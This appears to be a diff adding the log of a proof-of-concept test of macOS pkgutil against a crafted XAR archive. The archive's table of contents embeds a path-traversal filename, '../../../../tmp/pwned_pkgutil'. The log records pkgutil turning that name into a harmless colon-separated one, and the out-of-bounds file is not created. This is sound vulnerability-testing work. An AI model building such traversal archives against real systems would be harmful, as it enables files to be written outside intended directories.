@@ -1,0 +1,67 @@
+======================================
+  pkgutil Path Traversal PoC
+  Report: OE1104428478322
+  Runner label: macos-27
+======================================
+
+=== System ===
+ProductName:		macOS
+ProductVersion:		27.0.1
+BuildVersion:		26A434
+arm64
+
+=== pkgutil location ===
+/usr/sbin/pkgutil
+/usr/sbin/pkgutil: Mach-O universal binary with 3 architectures: [x86_64:Mach-O 64-bit executable x86_64] [arm64e:Mach-O 64-bit executable arm64e] [arm64e.x1:Mach-O 64-bit executable arm64e.x1]
+/usr/sbin/pkgutil (for architecture x86_64):	Mach-O 64-bit executable x86_64
+/usr/sbin/pkgutil (for architecture arm64e):	Mach-O 64-bit executable arm64e
+/usr/sbin/pkgutil (for architecture arm64e.x1):	Mach-O 64-bit executable arm64e.x1
+
+=== poc.xar embedded filename ===
+=== XAR TOC ===
+<?xml version="1.0" encoding="UTF-8"?>
+<xar>
+ <toc>
+  <creation-time>2026-10-28T00:00:00</creation-time>
+  <checksum style="sha1">
+   <size>20</size>
+   <offset>0</offset>
+  </checksum>
+  <file id="1">
+   <name>../../../../tmp/pwned_pkgutil</name>
+   <type>file</type>
+   <data>
+    <offset>20</offset>
+    <size>42</size>
+    <length>42</length>
+    <encoding style="application/octet-stream"/>
+    <extracted-checksum style="sha1">3d003d695f4be3aa1b4151ec139af92b61e2039c</extracted-checksum>
+    <archived-checksum style="sha1">3d003d695f4be3aa1b4151ec139af92b61e2039c</archived-checksum>
+   </data>
+  </file>
+ </toc>
+</xar>
+
+=== Embedded filenames ===
+  '../../../../tmp/pwned_pkgutil'
+  ^^^ PATH TRAVERSAL SEQUENCE DETECTED
+
+=== Running: pkgutil --expand poc.xar /tmp/safe_expand_dir ===
+pkgutil exit code: 0
+
+=== Contents inside safe_expand_dir (recursive) ===
+/tmp/safe_expand_dir
+/tmp/safe_expand_dir/..:..:..:..:tmp:pwned_pkgutil
+
+=== Broader /tmp scan for unexpected writes ===
+/tmp
+
+=== Out-of-bounds check: /tmp/pwned_pkgutil ===
+RESULT: /tmp/pwned_pkgutil NOT created
+
+=== Any file containing 'pwned' anywhere in /tmp ===
+
+=== Any file containing traversal payload ===
+(none)
+
+=== END OF LOG ===
